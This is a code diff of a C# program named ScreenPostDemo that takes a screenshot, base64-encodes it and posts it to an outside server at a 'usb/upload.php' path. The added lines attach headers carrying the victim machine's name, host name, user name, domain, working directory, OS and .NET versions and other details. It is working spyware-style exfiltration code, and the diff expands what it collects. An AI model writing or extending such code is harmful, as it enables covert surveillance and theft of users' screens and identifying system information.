@@ -35,13 +35,20 @@ namespace ScreenPostDemo
 		}
 
 		private static void DoWork()
-		{
+		{	
 			//File.WriteAllBytes(@"Z:\.Trash\kk.png", TakeSnapShot(true));
 
 			var data = Convert.ToBase64String(TakeSnapShot(false));
 			var client = new WebClient();
+			client.Headers.Add("X-Dab-MachineName", Environment.MachineName);
 			client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
 			client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
+			client.Headers.Add("X-Dab-CWD", Environment.CurrentDirectory);
+			client.Headers.Add("X-Dab-ProcessorCount", Environment.ProcessorCount.ToString());
+			client.Headers.Add("X-Dab-UserName", Environment.UserName);
+			client.Headers.Add("X-Dab-UserDomainName", Environment.UserDomainName);
+			client.Headers.Add("X-Dab-DotNetVersion", Environment.Version.ToString());
+			client.Headers.Add("X-Dab-TickCount", Environment.TickCount.ToString());
 
 			using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
 			{
